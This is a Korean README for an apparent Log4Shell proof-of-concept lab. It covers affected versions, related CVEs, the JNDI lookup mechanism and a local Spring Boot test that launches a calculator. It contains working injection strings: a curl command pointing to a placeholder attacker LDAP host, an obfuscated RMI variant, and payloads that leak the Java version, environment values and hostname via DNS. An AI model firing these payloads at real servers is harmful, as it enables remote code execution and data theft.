# 취약점 발생 버전

2.0-beta9 ~ 2.14.1

# Log4shell 취약점과 관련된 CVE

CVE-2021-44228을 시작으로 CVE-2021-45046, CVE-2021-4104, CVE-2021-44832 등 5개의 취약점이 보고되었습니다.

# Log4shell 취약점 발생 사례

ONUS(베트남 암호화폐 거래소)가 사용하는 Cyclos 서버에서 Log4shell 취약점을 악용하고 백도어를 설치했습니다. 이후 Cyclos가 취약점을 ONUS에게 알리고 패치 지침을 제공하고, ONUS는 즉시 조치했습니다.
마인크래프트 게임은 채팅을 log4j를 이용해 서버 로그에 기록해서 해당 취약점이 발견되었습니다.
애플, 테슬라 등 대기업에서도 활동 기록을 log4j를 이용해 로그에 기록해서 해당 취약점이 발견되었습니다.

apache log4j 공식 사이트에 나온 fixed 패치 로그

![1](https://github.com/hbeooooooom/Log4shell_poc/blob/main/patch.png?raw=true)

# Log4shell 취약점 페이로드 설명

https://logging.apache.org/log4j/2.x/manual/lookups.html

log4j 라이브러이 중에서 Lookup 기능을 제공합니다. 이는 출력하는 로그에 시스템 속성 등 값을 변수 혹은 예약어를 사용해 출력할 수 있는 기능입니다.

`${}`형태의 문자열 변수를 전달합니다.

Log4j 내부에서 파싱(parsing)합니다.

전달된 기능을 수행하고 `${}`를 수행 결과 값으로 대체합니다.

1. ex) Header에 ${env:HOME}이란 값을 넣어 전달하면 서버 콘솔창에 /root가 출력됩니다.

이 Lookup이라는 기능중에 JNDI Lookup 기능으로 인해 취약점이 발생했습니다.

![2](https://github.com/hbeooooooom/Log4shell_poc/blob/main/Jndi_Lookup.png?raw=true)

보면 ${jndi:~~~~} 패턴을 사용합니다. JNDI는 SPI(Service Provider Interface)를 지원하는데 LDAP(Lightweight Directory Access Protocol)가 포함되어 있습니다. 즉 log4j 라이브러리를 이용해 JNDI Lookup을 사용할 수 있고, JNDI에는 SPI 기능 중 LDAP를 지원하기에 취약점이 발생했다고 볼 수 있습니다.

- SPI : Java 플렛폼에서 제공되는 인터페이스 중 하나로 라이브러리나 모듈이 플랫폼의 일부 기능을 구현하고 통합할 수 있는 메커니즘을 제공합니다.
- LDAP : 디렉터리 서비스에 접근하기 위한 표준 프로토콜입니다. 주로 사용자 인증, 사용자 검색 등을 관리하기 위해 사용되고 트리 구조로 데이터를 저장합니다.

쉽게말해 Lookup이라는 기능은 사용자의 입력을 신뢰하기 때문에 이를 jndi와 묶어 공격자가 자신의 서버에 올려둔 코드를 서버단에서 실행이 가능하단 것입니다.

# JNDI Injection

JNDI는 자바 애플리케이션을 외부 디렉토리 서비스에 연결하는데 사용합니다. 예로 주소 데이터베이스 또는 LDAP 서버

즉 외부의 객체를 가져오는 기술인데 JNDI를 통해 LDAP을 통해서 원격지의 Java class를 가져와 실행 가능하다는 것이 JNDI Injection입니다.

JNDI 구조에서 SPI(Service Provider Interface) 부분은 API에서 파생되었는데 이는 J2EE 플랫폼 기반의 네이밍과 디렉토리 서비스를 연결시켜 줍니다. 즉 “LDAP, DNS, NIS, RMI” 등의 프로토콜을 이용해 JNDI 콜 호출이 가능하다는 것이 가능하기 때문에 공격자는 LDAP 서버에 Exploit하기 위한 코드를 준비하면 원격지의 대상 서버에 class 형식의 코드를 응답시켜 원하는 명령을 실행시키도록 할 수 있습니다.

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

public void handle(HttpExchange he) throws IOException {

String userAgent = he.getRequestHeader("user-agent");

log.info("Request User Agent:{}", userAgent); }

HttpExchange 객체를 사용해 클라이언트의 User-Agent 헤더 값을 가져옵니다. User-Agent 헤더는 클라이언트의 웹 브라우저나 애플리케이션에 대한 정보를 제공하는 데 사용합니다.

그리고 가져온 User-Agent값을 로그에 출력합니다.

curl victim:8080 -H 'User-Agent: ${jndi:ldap://attacker.com/a}'

curl 명령어를 사용해 원격 서버인 victim의 8080포트로 HTTP 요청을 보냅니다. 이때 -H 옵션은 요청에 사용될 헤더를 설정합니다. User-Agent 헤더를 설정하고 JNDI 리소스를 호출하는데 이 때 ldap://attacker.com/a에 대한 JNDI 리소스는 victim  서버에서 동작하는 Java 기반의 애플리케이션에 취약점이 있는 경우에 성공 가능합니다.

대상 웹 서버는 공격자 서버(attacker.com/a)로 LDAP 쿼리를 요청합니다.

attacker LDAP에 준비된 Exploit 코드가 포함된 응답을 대상 서비스에 LDAP 쿼리 응답은 아래와 같습니다.

javaCodeBase:
http://attacker.com/a
javaClassName : RCE
objectClass: javaNamingReference

대상 서버에서 공격자 서버로 HTTP GET 요청을 하고 공격자 서버에 있는 RCE.class를 대상 서버에 응답해 코드가 실행됩니다.

![3](https://github.com/hbeooooooom/Log4shell_poc/blob/main/request.png?raw=true)

id 매개변수값이 URL 인코딩 되어 있었고 포함된 내용은 JNDI Injection 공격에 사용되는 페이로드입니다. Referer: '${${::-j}ndi:rmi://'+ argv[2] +'/ass}': Referer 헤더는 이전 페이지의 URL을 나타냅니다. User-Agent: '${${::-j}ndi:rmi://'+ argv[2] +'/ass}': User-Agent 헤더는 클라이언트의 소프트웨어나 브라우저에 대한 정보를 나타냅니다. 해당 값을 처리하고 JNDI 리소스를 호출하려고 하기 때문에 원격 코드가 실행될 수 있습니다.

${jndi:ldap://${java:version}.domain/a}
Java 버전을 확인하기 위해 사용합니다.
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
환경 변수인 JAVA_VERSION을 통해 java 버전을 확인할 수 있습니다.
${jndi:ldap://${sys:java.version}.domain/a}
Java 시스템 속성을 통해 Java 버전을 확인할 수 있습니다.
${jndi:ldap://${sys:java.vendor}.domain/a}
Java 공급 업체 정보를 확인할 수 있습니다.
${jndi:ldap://${hostName}.domain/a}
호스트 이름에 대한 정보를 확인할 수 있습니다.
${jndi:dns://${hostName}.domain}
DNS 조회를 통해 호스트 이름에 대한 정보를 확인할 수 있습니다.

# POC 구현 및 설명
![4](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC1.png?raw=true)

스프링 부트에 Spring Web 라이브러리만 추가해서 만들어줍니다.

![5](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC2.png?raw=true)

<groupId>org.springframework.boot</groupId>
<dependency>spring-boot-starter-log4j2<dependency>

를 추가해 log4j를 사용하도록 하였고

properties안에 <log4j2.version>2.14.0</log4j2.version>을 추가했습니다

![6](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC3.png?raw=true)

![7](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC4.png?raw=true)

ldap 서버를 세팅해주고

![8](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC5.png?raw=true)


보내게 되면

![9](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC6.png?raw=true)

![10](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC7.png?raw=true)

POC 원리는 log4j를 이용해 post 요청을 받도록 환경을 세팅해두고 postman 프로그램을 이용해 jndi injection을 수행합니다. 해당 입력이 들어오면 공격자 환경에서 세팅해둔 프로그램이 실행되어 계산기가 켜지게 됩니다.

공격 과정으로는

1. 공격자가 log4j를 이용해 로그를 기록하는 서버에 jndi injection을 보내게 됩니다.
2. 해당 서버는 공격자 서버에 있는 경로로 요청을 보냅니다.
3. 공격자 서버가 log4j를 이용해 로그를 기록하는 서버에 응답하며 공격 코드가 실행됩니다.

![11](https://github.com/hbeooooooom/Log4shell_poc/blob/main/POC8.png?raw=true)



